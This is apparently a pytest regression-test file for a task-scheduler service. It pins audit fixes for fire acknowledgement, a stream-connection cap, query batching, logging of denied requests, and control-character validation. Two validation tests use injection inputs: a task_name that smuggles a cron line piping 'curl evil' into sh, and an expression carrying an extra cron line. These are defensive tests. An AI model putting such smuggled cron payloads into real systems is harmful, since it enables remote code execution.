"""Regression tests for the second-round Apr 2026 brain audit.

Pins the I-1 IDOR fix, the WatchSchedules connection cap, the N+1
batch-loading fixes, and the audit-on-denial middleware behavior
introduced in the deep-audit follow-up batch.
"""

from __future__ import annotations

import secrets
import uuid
from datetime import UTC, datetime
from unittest.mock import MagicMock

import pytest


# =====================================================================
# I-1: AcknowledgeFireResult correlation goes through schedule_fires
# =====================================================================


class TestI1AckCorrelationByScheduleFires:
    """Pre-fix: ack lookup used ``Schedule.last_fire_id`` (a moving
    target overwritten on every fire). Two back-to-back in-flight
    fires raced - the second fire's FireSchedule overwrote
    last_fire_id BEFORE the first ack landed, and the first ack
    silently no-op'd or hit the wrong row.

    Post-fix: ack lookup joins ``schedule_fires.fire_id`` (UNIQUE).
    Lookup is unambiguous and idempotent across concurrent fires.
    """

    @pytest.mark.asyncio
    async def test_ack_resolves_via_schedule_fires_join(self) -> None:
        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool

        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.enums import ScheduleKind
        from z4j_brain.persistence.models import (
            Project, Schedule, ScheduleFire,
        )
        from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            db = DatabaseManager(engine)
            settings = Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev", log_json=False,
            )

            project_id = uuid.uuid4()
            schedule_id_a = uuid.uuid4()
            schedule_id_b = uuid.uuid4()
            fire_id_a = uuid.uuid4()
            fire_id_b = uuid.uuid4()

            async with db.session() as s:
                s.add(Project(id=project_id, slug="proj", name="Proj"))
                # Schedule A: most recent FireSchedule was fire_id_b
                # (overwriting fire_id_a's pointer). Pre-fix, an ack
                # for fire_id_a would silently no-op because
                # last_fire_id no longer == fire_id_a.
                s.add(Schedule(
                    id=schedule_id_a, project_id=project_id,
                    engine="celery", scheduler="z4j-scheduler",
                    name="A", task_name="t.t",
                    kind=ScheduleKind.CRON, expression="0 * * * *",
                    timezone="UTC", args=[], kwargs={},
                    is_enabled=True,
                    last_fire_id=fire_id_b,  # B overwrote A
                    total_runs=0,
                ))
                s.add(Schedule(
                    id=schedule_id_b, project_id=project_id,
                    engine="celery", scheduler="z4j-scheduler",
                    name="B", task_name="t.t",
                    kind=ScheduleKind.CRON, expression="0 * * * *",
                    timezone="UTC", args=[], kwargs={},
                    is_enabled=True,
                    last_fire_id=fire_id_b,
                    total_runs=0,
                ))
                # Both fires recorded in schedule_fires (the
                # authoritative table). Post-fix the ack lookup
                # joins on schedule_fires.fire_id so it correctly
                # routes the ack to schedule A even though A's
                # last_fire_id has been overwritten.
                now = datetime.now(UTC)
                s.add(ScheduleFire(
                    fire_id=fire_id_a, schedule_id=schedule_id_a,
                    project_id=project_id, command_id=None,
                    status="delivered",
                    scheduled_for=now, fired_at=now,
                ))
                s.add(ScheduleFire(
                    fire_id=fire_id_b, schedule_id=schedule_id_b,
                    project_id=project_id, command_id=None,
                    status="delivered",
                    scheduled_for=now, fired_at=now,
                ))
                await s.commit()

            servicer = SchedulerServiceImpl(
                settings=settings, db=db,
                command_dispatcher=None,  # type: ignore[arg-type]
                audit_service=None,  # type: ignore[arg-type]
            )

            # Mock context with a no-op auth_context (no binding
            # restrictions in this Settings).
            ctx = MagicMock()
            ctx.auth_context.return_value = {}

            # Ack fire_id_a. Pre-fix this would silently no-op
            # because Schedule A's last_fire_id was overwritten
            # by B. Post-fix the join finds Schedule A via
            # schedule_fires and updates its last_run_at.
            request = pb.AcknowledgeFireResultRequest(
                fire_id=str(fire_id_a),
                status="success",
            )
            await servicer.AcknowledgeFireResult(request, ctx)

            # Verify Schedule A was updated, NOT Schedule B.
            from sqlalchemy import select
            async with db.session() as s:
                result = await s.execute(
                    select(Schedule).where(Schedule.id == schedule_id_a),
                )
                a = result.scalar_one()
                result = await s.execute(
                    select(Schedule).where(Schedule.id == schedule_id_b),
                )
                b = result.scalar_one()

            assert a.last_run_at is not None, (
                "ack for fire_id_a should update Schedule A's "
                "last_run_at via schedule_fires join (not via "
                "Schedule.last_fire_id which was overwritten by B)"
            )
            assert a.total_runs == 1
            # Schedule B was untouched - the ack for fire_id_a did
            # not accidentally land on B.
            assert b.last_run_at is None, (
                "ack for fire_id_a must not touch Schedule B even "
                "though B's last_fire_id == fire_id_b matches a "
                "completely different fire"
            )
        finally:
            await engine.dispose()


# =====================================================================
# WatchSchedules concurrency cap
# =====================================================================


class TestWatchSchedulesConcurrencyCap:
    """Pre-fix: every WatchSchedules RPC opened a fresh asyncpg
    LISTEN connection with no cap. A misbehaving scheduler that
    opened+dropped streams in a loop drained Postgres
    ``max_connections`` and killed brain's main pool. Post-fix:
    global semaphore + per-CN counter; new streams over the cap
    abort with RESOURCE_EXHAUSTED."""

    def test_settings_default_cap_sane(self) -> None:
        from z4j_brain.settings import Settings

        s = Settings(
            database_url="sqlite+aiosqlite:///:memory:",
            secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
            session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
            environment="dev", log_json=False,
        )
        # Defaults bounded by realistic fleet ceiling.
        assert s.scheduler_grpc_watch_max_concurrent == 64
        assert s.scheduler_grpc_watch_max_per_cert == 4

    def test_settings_below_min_rejected(self) -> None:
        """``ge=1`` floor on per-cert cap so an operator can't
        configure '0 streams allowed' which would 100% deny."""
        from pydantic import ValidationError as _PydanticValidationError

        from z4j_brain.settings import Settings

        with pytest.raises(_PydanticValidationError):
            Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev", log_json=False,
                scheduler_grpc_watch_max_per_cert=0,
            )


# =====================================================================
# R10-Sched-H1: WatchSchedules counter-under-lock (no semaphore leak)
# =====================================================================


class TestWatchSchedulesCounterUnderLock:
    """Round-10 audit fix R10-Sched-H1 (Apr 2026).

    The R7-MED-2 / R8 fix replaced a racy ``locked()`` + ``acquire()``
    with ``asyncio.wait_for(sem.acquire(), 0)``, but
    ``wait_for(coro, 0)`` is documented as racy when ``coro``
    completes synchronously: the timer fires in the same tick, the
    task is cancelled AFTER it succeeded, the slot is decremented
    but the caller sees TimeoutError. Plus an acquire-then-cancel
    window between two non-adjacent try-blocks left the slot held
    on cancellation in the gap. Production observed the cap exhaust
    over hours from a single client's reconnect loop.

    Post-fix: counter under a single ``asyncio.Lock`` (atomic
    increment), shielded ``_release_watch_slot`` decrement
    (cancellation-safe), single try/finally over the whole stream
    body (no acquire-then-cancel gap).
    """

    def test_handlers_no_longer_uses_wait_for_sem_acquire(self) -> None:
        """The racy ``wait_for(sem.acquire(), 0)`` pattern is gone.

        Strips comment + docstring lines before the substring check
        so the explanatory R10 comment block (which intentionally
        names the pre-fix expression) doesn't trip the assertion.
        """
        from pathlib import Path

        src = (
            Path(__file__).resolve().parents[2]
            / "src" / "z4j_brain" / "scheduler_grpc" / "handlers.py"
        ).read_text()

        # Strip comment lines (full-line `#` and trailing `# ...`).
        # We keep code intact so an actual call still gets caught.
        code_lines = []
        in_docstring = False
        for raw in src.splitlines():
            stripped = raw.lstrip()
            # Toggle docstring blocks on triple-quote lines (rough
            # but good enough for this repo's style).
            triple_count = stripped.count('"""')
            if in_docstring:
                if triple_count >= 1:
                    in_docstring = False
                continue
            if triple_count == 1 and not stripped.endswith('"""'):
                in_docstring = True
                continue
            if triple_count >= 2:
                # Single-line docstring, skip it.
                continue
            if stripped.startswith("#"):
                continue
            # Trailing inline comment.
            if " #" in raw:
                raw = raw.split(" #", 1)[0]
            code_lines.append(raw)
        code = "\n".join(code_lines)

        # The exact pre-fix expression must not reappear in code.
        assert "wait_for(self._watch_global_sem.acquire()" not in code
        # The semaphore attribute itself shouldn't even exist for
        # the WatchSchedules cap any more, counter under lock is
        # the contract.
        assert "_watch_global_sem" not in code

    def test_handlers_uses_counter_under_lock(self) -> None:
        """Increment is atomic under the global lock."""
        from pathlib import Path

        src = (
            Path(__file__).resolve().parents[2]
            / "src" / "z4j_brain" / "scheduler_grpc" / "handlers.py"
        ).read_text()
        assert "_watch_global_count" in src
        assert "_watch_global_lock" in src
        assert "self._watch_global_count += 1" in src
        # The decrement must be reachable through the shielded
        # release helper.
        assert "_release_watch_slot" in src

    def test_release_is_shielded(self) -> None:
        """The decrement runs under ``asyncio.shield`` so a cancel
        landing on the lock-acquire await can't strand the slot."""
        from pathlib import Path

        src = (
            Path(__file__).resolve().parents[2]
            / "src" / "z4j_brain" / "scheduler_grpc" / "handlers.py"
        ).read_text()
        # The shield wraps the release helper.
        assert "asyncio.shield(" in src
        assert "self._release_watch_slot(" in src

    def test_release_helper_decrements_both_counters(self) -> None:
        """Symmetric decrement of global + per-cert under their own
        locks. A bug here re-introduces the leak even though the
        outer try/finally looks right."""
        from pathlib import Path

        src = (
            Path(__file__).resolve().parents[2]
            / "src" / "z4j_brain" / "scheduler_grpc" / "handlers.py"
        ).read_text()
        # Locate the helper body and assert it touches both
        # counters.
        helper_start = src.index("async def _release_watch_slot(")
        helper_body = src[helper_start:helper_start + 2000]
        assert "self._watch_global_count -= 1" in helper_body
        assert "self._watch_per_cert_count[cert_cn] -= 1" in helper_body

    def test_negative_counter_is_logged_loud(self) -> None:
        """Defensive assertion: the helper resets the counter to 0
        on negative AND logs at ERROR. A negative counter is a
        code bug (release called more than acquire), not a runtime
        condition the operator can fix."""
        from pathlib import Path

        src = (
            Path(__file__).resolve().parents[2]
            / "src" / "z4j_brain" / "scheduler_grpc" / "handlers.py"
        ).read_text()
        helper_start = src.index("async def _release_watch_slot(")
        helper_body = src[helper_start:helper_start + 2000]
        assert "self._watch_global_count < 0" in helper_body
        assert "logger.error" in helper_body
        # The reset itself.
        assert "self._watch_global_count = 0" in helper_body

    def test_init_seeds_counter_at_zero(self) -> None:
        """The constructor must initialise the counter to 0, a
        leftover semaphore-only init would leave the attribute
        missing and the first acquire would AttributeError."""
        from pathlib import Path

        src = (
            Path(__file__).resolve().parents[2]
            / "src" / "z4j_brain" / "scheduler_grpc" / "handlers.py"
        ).read_text()
        assert "self._watch_global_count: int = 0" in src
        assert "self._watch_global_cap = " in src


# =====================================================================
# N+1: import + diff endpoints batch their existing-row lookups
# =====================================================================


class TestN1BatchLookups:
    """Pre-fix: ``import_schedules`` failure-recovery path issued
    one SELECT per failed row; ``diff_schedules`` issued one SELECT
    per row. Post-fix: a single ``tuple_(scheduler, name).in_(...)``
    query loads the entire batch.

    We assert at the source level rather than counting actual SQL
    queries because the loop structure is the contract; a future
    refactor that re-introduces row-by-row SELECTs should trip the
    suite even if the test fixture is too small to manifest the
    perf regression.
    """

    def test_import_handler_uses_tuple_in_for_failure_recovery(
        self,
    ) -> None:
        from pathlib import Path

        src = (
            Path(__file__).resolve().parents[2]
            / "src" / "z4j_brain" / "api" / "schedules.py"
        ).read_text()
        # The fixed-up import handler builds existing_id_map from a
        # single tuple_(...).in_(batch_keys) lookup before the loop.
        assert "tuple_(Schedule.scheduler, Schedule.name).in_(" in src
        assert "existing_id_map" in src

    def test_diff_handler_uses_tuple_in(self) -> None:
        from pathlib import Path

        src = (
            Path(__file__).resolve().parents[2]
            / "src" / "z4j_brain" / "api" / "schedules.py"
        ).read_text()
        assert "diff_batch_keys" in src
        assert "existing_rows: dict[tuple[str, str], Schedule] = {}" in src


# =====================================================================
# Audit middleware: 403 / 422 on schedule endpoints leave audit rows
# =====================================================================


class TestAuditMiddlewareDenialRows:
    """Pre-fix: 403 / 422 / 404 on REST schedule endpoints left
    zero audit-log evidence. Brute-force IDOR enumeration was
    forensically invisible. Post-fix: ``ErrorMiddleware._record_
    denial_if_relevant`` writes an audit row to the tamper-evident
    ``audit_log`` table for every audited path + method + Z4JError
    combination."""

    def test_audited_path_regex_matches_schedule_endpoints(self) -> None:
        from z4j_brain.middleware.errors import _AUDITED_PATH_RE

        m = _AUDITED_PATH_RE.match("/api/v1/projects/acme/schedules")
        assert m is not None
        assert m.group("slug") == "acme"

        m = _AUDITED_PATH_RE.match(
            "/api/v1/projects/acme/schedules/12345/trigger",
        )
        assert m is not None
        assert m.group("slug") == "acme"

    def test_audited_path_regex_excludes_unrelated(self) -> None:
        from z4j_brain.middleware.errors import _AUDITED_PATH_RE

        # Different resource - should not match.
        assert _AUDITED_PATH_RE.match("/api/v1/projects/acme/agents") is None
        # No project prefix.
        assert _AUDITED_PATH_RE.match("/api/v1/users") is None

    def test_audited_methods_include_mutations(self) -> None:
        from z4j_brain.middleware.errors import _AUDITED_METHODS

        assert "POST" in _AUDITED_METHODS
        assert "PATCH" in _AUDITED_METHODS
        assert "DELETE" in _AUDITED_METHODS
        assert "PUT" in _AUDITED_METHODS
        # GET / HEAD intentionally excluded - read-only.
        assert "GET" not in _AUDITED_METHODS
        assert "HEAD" not in _AUDITED_METHODS

    @pytest.mark.asyncio
    async def test_denial_audit_written_for_403(self) -> None:
        """End-to-end: a 403 on a schedule endpoint produces an
        audit row whose action is ``schedules.access.denied``."""
        from sqlalchemy import select
        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool
        from starlette.requests import Request

        from z4j_brain.errors import AuthorizationError
        from z4j_brain.middleware.errors import _record_denial_if_relevant
        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.models import AuditLog, Project
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            db = DatabaseManager(engine)
            settings = Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev", log_json=False,
            )
            async with db.session() as s:
                s.add(Project(id=uuid.uuid4(), slug="acme", name="Acme"))
                await s.commit()

            # Round-4 audit fix (Apr 2026): start the bounded
            # async queue + background drain task. The middleware
            # now enqueues fire-and-forget; the drain task writes
            # the audit row.
            from z4j_brain.middleware._audit_queue import AuditQueue
            audit_queue = AuditQueue()
            audit_queue.start(db=db, settings=settings)

            # Build a minimal Request-shaped object the middleware
            # helper consumes. Starlette's Request constructor needs
            # a scope dict; we set the bare minimum.
            scope = {
                "type": "http",
                "method": "DELETE",
                "path": "/api/v1/projects/acme/schedules/some-id",
                "headers": [],
                "query_string": b"",
                "raw_path": b"/api/v1/projects/acme/schedules/some-id",
            }
            request = Request(scope)
            # Inject the app.state expected by the helper.
            request.scope["app"] = MagicMock()
            request.app.state.db = db
            request.app.state.settings = settings
            request.app.state.audit_queue = audit_queue
            request.state.real_client_ip = "127.0.0.1"

            await _record_denial_if_relevant(
                request,
                exc=AuthorizationError("test denial"),
            )

            # Drain the queue so the row lands before we assert.
            await audit_queue.stop()

            async with db.session() as s:
                result = await s.execute(
                    select(AuditLog).where(
                        AuditLog.action == "schedules.access.denied",
                    ),
                )
                rows = list(result.scalars().all())
            assert len(rows) == 1, (
                "denial on a /schedules path must leave one audit row"
            )
            assert rows[0].outcome == "deny"
            assert rows[0].source_ip == "127.0.0.1"
        finally:
            await engine.dispose()


# =====================================================================
# Round-3: task_name + expression control-char rejection
# =====================================================================


class TestRound3TaskNameControlCharRejected:
    """Pre-fix: ``ScheduleCreateIn.task_name`` only had min/max
    length, no ``pattern=``. A project admin could submit a
    newline-bearing task_name that the cron exporter then
    interpolated into a comment line, breaking out into an active
    crontab line. Post-fix: ``pattern=_NO_CONTROL_CHARS`` on
    ``task_name`` (and ``expression``) on every schedule schema
    rejects control chars at the API boundary."""

    def test_create_rejects_newline_in_task_name(self) -> None:
        from pydantic import ValidationError as _PVE

        from z4j_brain.api.schedules import ScheduleCreateIn

        with pytest.raises(_PVE):
            ScheduleCreateIn(
                name="ok",
                engine="celery",
                kind="cron",
                expression="0 * * * *",
                task_name="x\n* * * * * curl evil|sh\n#",
            )

    def test_create_rejects_null_byte_in_task_name(self) -> None:
        from pydantic import ValidationError as _PVE

        from z4j_brain.api.schedules import ScheduleCreateIn

        with pytest.raises(_PVE):
            ScheduleCreateIn(
                name="ok",
                engine="celery",
                kind="cron",
                expression="0 * * * *",
                task_name="x\x00y",
            )

    def test_create_rejects_control_char_in_expression(self) -> None:
        from pydantic import ValidationError as _PVE

        from z4j_brain.api.schedules import ScheduleCreateIn

        with pytest.raises(_PVE):
            ScheduleCreateIn(
                name="ok",
                engine="celery",
                kind="cron",
                expression="0 * * * *\n* * * * * evil",
                task_name="t.t",
            )

    def test_update_rejects_newline_in_task_name(self) -> None:
        from pydantic import ValidationError as _PVE

        from z4j_brain.api.schedules import ScheduleUpdateIn

        with pytest.raises(_PVE):
            ScheduleUpdateIn(task_name="x\ny")

    def test_imported_rejects_newline_in_task_name(self) -> None:
        from pydantic import ValidationError as _PVE

        from z4j_brain.api.schedules import ImportedScheduleIn

        with pytest.raises(_PVE):
            ImportedScheduleIn(
                name="ok",
                engine="celery",
                kind="cron",
                expression="0 * * * *",
                task_name="x\ny",
            )

    def test_create_accepts_legitimate_task_name(self) -> None:
        from z4j_brain.api.schedules import ScheduleCreateIn

        # Valid task name should still parse cleanly.
        body = ScheduleCreateIn(
            name="hourly",
            engine="celery",
            kind="cron",
            expression="0 * * * *",
            task_name="myapp.tasks.heartbeat",
        )
        assert body.task_name == "myapp.tasks.heartbeat"


# =====================================================================
# Round-3: FireSchedule scheduler-kind filter
# =====================================================================


class TestRound3FireScheduleSchedulerFilter:
    """Pre-fix: ``FireSchedule`` loaded the schedule by id alone
    without filtering on ``Schedule.scheduler == 'z4j-scheduler'``.
    A bound z4j-scheduler peer that knew (via side-channel) the
    UUID of a celery-beat-managed row could fire it, defeating
    the documented "two scheduling surfaces don't step on each
    other" invariant. Post-fix: the SELECT filters on the
    scheduler column and returns ``schedule_not_found`` (same
    code as a missing row, so a hostile peer can't use the
    error-code split to enumerate which UUIDs exist)."""

    @pytest.mark.asyncio
    async def test_celery_beat_row_returns_schedule_not_found(
        self,
    ) -> None:
        from sqlalchemy.ext.asyncio import create_async_engine
        from sqlalchemy.pool import StaticPool

        from z4j_brain.persistence.base import Base
        from z4j_brain.persistence.database import DatabaseManager
        from z4j_brain.persistence.enums import ScheduleKind
        from z4j_brain.persistence.models import Project, Schedule
        from z4j_brain.scheduler_grpc.handlers import SchedulerServiceImpl
        from z4j_brain.scheduler_grpc.proto import scheduler_pb2 as pb
        from z4j_brain.settings import Settings

        engine = create_async_engine(
            "sqlite+aiosqlite:///:memory:",
            poolclass=StaticPool,
            connect_args={"check_same_thread": False},
        )
        async with engine.begin() as conn:
            await conn.run_sync(Base.metadata.create_all)
        try:
            db = DatabaseManager(engine)
            settings = Settings(
                database_url="sqlite+aiosqlite:///:memory:",
                secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                session_secret=secrets.token_urlsafe(48),  # type: ignore[arg-type]
                environment="dev", log_json=False,
            )
            project_id = uuid.uuid4()
            celery_beat_schedule_id = uuid.uuid4()
            async with db.session() as s:
                s.add(Project(id=project_id, slug="acme", name="Acme"))
                # Row owned by celery-beat (NOT z4j-scheduler).
                s.add(Schedule(
                    id=celery_beat_schedule_id,
                    project_id=project_id,
                    engine="celery",
                    scheduler="celery-beat",  # different surface
                    name="cb-row",
                    task_name="t.t",
                    kind=ScheduleKind.CRON,
                    expression="0 * * * *",
                    timezone="UTC", args=[], kwargs={},
                    is_enabled=True,
                ))
                await s.commit()

            servicer = SchedulerServiceImpl(
                settings=settings, db=db,
                command_dispatcher=None,  # type: ignore[arg-type]
                audit_service=None,  # type: ignore[arg-type]
            )
            ctx = MagicMock()
            ctx.auth_context.return_value = {}

            request = pb.FireScheduleRequest(
                schedule_id=str(celery_beat_schedule_id),
                fire_id=str(uuid.uuid4()),
            )
            response = await servicer.FireSchedule(request, ctx)
            # Cross-scheduler fire must return the same opaque
            # error a missing row returns - no enumeration oracle.
            assert response.error_code == "schedule_not_found", (
                "FireSchedule must reject cross-scheduler rows "
                "with ``schedule_not_found`` - actual: "
                f"{response.error_code!r}"
            )
        finally:
            await engine.dispose()
